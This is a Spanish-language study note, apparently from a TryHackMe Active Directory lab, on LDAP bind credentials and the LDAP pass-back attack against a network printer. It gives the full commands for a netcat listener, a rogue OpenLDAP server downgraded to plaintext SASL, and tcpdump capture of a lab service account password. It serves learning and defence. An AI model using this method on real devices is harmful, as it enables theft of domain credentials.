---
layout: apunte
title: "4. LDAP Bind Credentials"
---

<h2>LDAP</h2>
Otro método de autentificación que las aplicaciones pueden usar es Lightweight Directory Access Protocol (LDAP). Esta autentificación es similar a la NTLM. Sin embargo, esta la aplicación verifica directamente las credenciales de usuario. La aplicación tiene un par de credenciales AD que usa para consultar LDAP y luego verificar las credenciales del usuario AD.

La autentificación LDAP es un mecanismo popular con aplicaciones de terceros (no Microsoft) que se integran con AD. Estas incluyen aplicaciones y sistemas como:

- Gitlab
- Jenkins
- Aplicaciones custom
- Impresoras
- VPNs

Si cualquiera de estas aplicaciones o servicios son expuestos a internet, el mismo tipo de ataques a aquellos usados contra sistemas de autentificación NTLM pueden ser usados. Sin embargo, como un servicio que use autentificación LDAP requiere de un set de credenciales AD, abre formas adicionales de ataque. En esencia, podemos intentar recuperar las credenciales AD usadas por el servicio para ganar acceso autentificado al AD. El proceso de autentificación LDAP es así:

!**Pasted image 20260710203321.png**

Si puedes ganar acceso al host correcto, como un servidor Gitlab, puede ser tan simple como leer los archivos de configuración para recuperar estas credenciales AD. Estas credenciales suelen estar guardadas en texto plano ya que el modelo de seguridad se basa en mantener la localización y almacenaje de los archivos de configuración segura, más que en el contenido.

--------------------------------------
<h2>Ataques Pass-Back LDAP</h2>
Otro ataque muy interesante que puede ser realizado contra los mecanismos de autentificación LDAP, es llamado LDAP Pass-Back attack. Es un ataque común contra dispositivos de red como impresoras cuando has ganado acceso inicial a la red.

Los ataques pass-back LDAP pueden ser realizados cuando ganamos acceso a la configuración del dispositivo donde se especifican los parámetros LDAP. Esto puede ser, por ejemplo, la interfaz de web de una impresora de red. Normalmente, las credenciales se mantienen las por defecto, como `admin:admin` o `admin:password`. Aquí no seremos capaces de extraer credenciales LDAP ya que la contraseña suele estar escondida. Sin embargo, podemos alterar la configuración LDAP, como la IP o el hostname del servidor LDAP. En un ataque pass-back LDAP, podemos modificar esta IP a la nuestra y luego comprobar la configuración LDAP, la cual forzará al dispositivo a intentar autentificación LDAP a nuestro dispositivo mercenario. Podemos interceptar este intento de autentificación y capturar las credenciales LDAP.

--------------------------------------
<h2>Realizar un Ataque LDAP Pass-Back</h2>
Hay una impresora de red donde la web de administración no requiere credenciales. Navega a http://printer.za.tryhackme.com/settings.aspx para encontrar la página de ajustes de la impresora.

!**Pasted image 20260711170314.png**

Usando la inspección de navegador, también podemos verificar que la web de la impresora fue al menos lo suficientemente segura como para no mandar la contraseña de vuelta por el navegador:

!**Pasted image 20260711170400.png**

Por lo que tenemos el nombre de usuario pero no la contraseña. Sin embargo, cuando presionamos en los ajustes, podemos ver que la petición de autentificación se hace al controlador de dominio para comprobar las credenciales LDAP. Vamos a intentar explotar esto para que la impresora se conecte a nosotros en su lugar. Para hacerlo, usaremos un listener Netcat. Como el puerto por defecto de LDAP es el 389, usaremos el comando:

```bash
nc -lvp 389
```

Verás que recibes una conexión:

```bash
[thm@thm]$ nc -lvp 389
listening on [any] 389 ...
10.10.10.201: inverse host lookup failed: Unknown host
connect to [10.10.10.55] from (UNKNOWN) [10.10.10.201] 49765
0?DC?;
?
?x
 objectclass0?supportedCapabilities
```

Pero hay un pequeño problema. El `supportedCapabilities` nos dice que hay un problema . Básicamente, antes de mandar las credenciales LDAP, la impresora está tratando de negociar los detalles del método de autentificación LDAP. Usará esta negociación para seleccionar el método de autentificación más seguro que tanto la impresora como el servidor LDAP soporten. Si el método de autentificación es muy seguro, las credenciales no serán transmitidas en texto claro. Con algunos métodos de autentificación, las credenciales ni siquiera serán transmitidas a través de la red. Por lo que no podemos usar Netcat para obtener las credenciales sino que tendremos que crear un servidor LDAP mercenario y configurarlo de manera segura para asegurarnos de que las credenciales se manden en texto plano.

-----------------------------------------
<h2>Hostear un Servidor LDAP Mercenario</h2>
Hay varias maneras de hostear un servidor LDAP mercenario, pero usaremos OpenLDAP para este ejemplo. Para instalarlo, usa el comando:

```bash
sudo apt-get update && sudo apt-get -y install slapd-utils && sudo systemctl enable slapd
```

Comenzaremos reconfigurando el servidor LDAP con el comando:

```bash
sudo dpkg-reconfigure -p low slapd
```

Presiona **No** cuando te pregunten si quieres saltar la configuración del servidor.

!**Pasted image 20260711172655.png**

Para el nombre de dominio, quieres darle el dominio objetivo: `za.tryhackme.com`:

!**Pasted image 20260711172723.png**

Usa este mismo nombre para la Organización:

!**Pasted image 20260711172738.png**

Da cualquier contraseña de Administrator:

!**Pasted image 20260711172753.png**

Selecciona MDB como base de datos LDAP a usar:

!**Pasted image 20260711172811.png**

Para las últimas dos opciones, asegúrate de que la base de datos no es eliminada al  purgar:

!**Pasted image 20260711172839.png**

Y mueve la base de datos antigua antes de crear una nueva:

!**Pasted image 20260711172906.png**

Antes de usar el servidor LDAP mercenario, necesitamos hacerlo vulnerable desactualizando los mecanismos de autentificación soportados. Queremos asegurar que nuestro servidor LDAP sólo soporte los métodos de autentificación PLAIN y LOGIN. Para hacer esto, creamos un archivo ldif nuevo, llamado con el siguiente contenido:

```ldif
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

Este archivo tiene las propiedades:

- **olcSaslSecProps:** Especifica las propiedades de seguridad SASL.
- **noanonymous:** Deshabilita mecanismos que soportan login anónimo.
- **minssf:** Especifica el mínimo aceptable de fuerza de seguridad, con 0 significando no protección.

Ahora, podemos usar el archivo LDIF para parchear nuestro servidor LDAP usando el siguiente comando:

```bash
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
```

Puedes comprobar si ha funcionado con:

```bash
[thm@thm]$ ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
dn:
supportedSASLMechanisms: PLAIN
supportedSASLMechanisms: LOGIN
```

-----------------------------------
<h2>Capturar las Credenciales LDAP</h2>
Nuestro servidor LDAP mercenario ha sido configurado. Cuando hagamos click en "Test Settings", la autentificación ocurrirá en texto plano. Si lo configuraste bien y aún así recibes el error: "This distinguished name contains invalid syntax", usa `tcpdump` para capturar credenciales usando el siguiente comando:

```bash
[thm@thm]$ sudo tcpdump -SX -i breachad tcp port 389
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), snapshot length 262144 bytes
10:41:52.979933 IP 10.10.10.201.49834 > 10.10.10.57.ldap: Flags [P.], seq 4245946075:4245946151, ack 1113052386, win 8212, length 76
	0x0000:  4500 0074 b08c 4000 8006 20e2 0a0a 0ac9  E..t..@.........
	0x0010:  0a0a 0a39 c2aa 0185 fd13 fedb 4257 d4e2  ...9........BW..
	0x0020:  5018 2014 1382 0000 3084 0000 0046 0201  P.......0....F..
	0x0030:  0263 8400 0000 3d04 000a 0100 0a01 0002  .c....=.........
	0x0040:  0100 0201 7801 0100 870b 6f62 6a65 6374  ....x.....object
	0x0050:  636c 6173 7330 8400 0000 1904 1773 7570  class0.......sup
	0x0060:  706f 7274 6564 5341 534c 4d65 6368 616e  portedSASLMechan
	0x0070:  6973 6d73                                isms
10:41:52.979938 IP 10.10.10.57.ldap > 10.10.10.201.49834: Flags [.], ack 4245946151, win 502, length 0
	0x0000:  4500 0028 247d 4000 4006 ed3d 0a0a 0a39  E..($}@.@..=...9
	0x0010:  0a0a 0ac9 0185 c2aa 4257 d4e2 fd13 ff27  ........BW.....'
	0x0020:  5010 01f6 2930 0000                      P...)0..
10:41:52.980162 IP 10.10.10.57.ldap > 10.10.10.201.49834: Flags [P.], seq 1113052386:1113052440, ack 4245946151, win 502, length 54
	0x0000:  4500 005e 247e 4000 4006 ed06 0a0a 0a39  E..^$~@.@......9
	0x0010:  0a0a 0ac9 0185 c2aa 4257 d4e2 fd13 ff27  ........BW.....'
	0x0020:  5018 01f6 2966 0000 3034 0201 0264 2f04  P...)f..04...d/.
	0x0030:  0030 2b30 2904 1773 7570 706f 7274 6564  .0+0)..supported
	0x0040:  5341 534c 4d65 6368 616e 6973 6d73 310e  SASLMechanisms1.
	0x0050:  0405 504c 4149 4e04 054c 4f47 494e       ..PLAIN..LOGIN
[....]
10:41:52.987145 IP 10.10.10.201.49835 > 10.10.10.57.ldap: Flags [.], ack 3088612909, win 8212, length 0
	0x0000:  4500 0028 b092 4000 8006 2128 0a0a 0ac9  E..(..@...!(....
	0x0010:  0a0a 0a39 c2ab 0185 8b05 d64a b818 7e2d  ...9.......J..~-
	0x0020:  5010 2014 0ae4 0000 0000 0000 0000       P.............
10:41:52.989165 IP 10.10.10.201.49835 > 10.10.10.57.ldap: Flags [P.], seq 2332415562:2332415627, ack 3088612909, win 8212, length 65
	0x0000:  4500 0069 b093 4000 8006 20e6 0a0a 0ac9  E..i..@.........
	0x0010:  0a0a 0a39 c2ab 0185 8b05 d64a b818 7e2d  ...9.......J..~-
	0x0020:  5018 2014 3afe 0000 3084 0000 003b 0201  P...:...0....;..
	0x0030:  0560 8400 0000 3202 0102 0418 7a61 2e74  .`....2.....za.t
	0x0040:  7279 6861 636b 6d65 2e63 6f6d 5c73 7663  ryhackme.com\svc
	0x0050:  4c44 4150 8013 7472 7968 6163 6b6d 656c  LDAP..password11
```

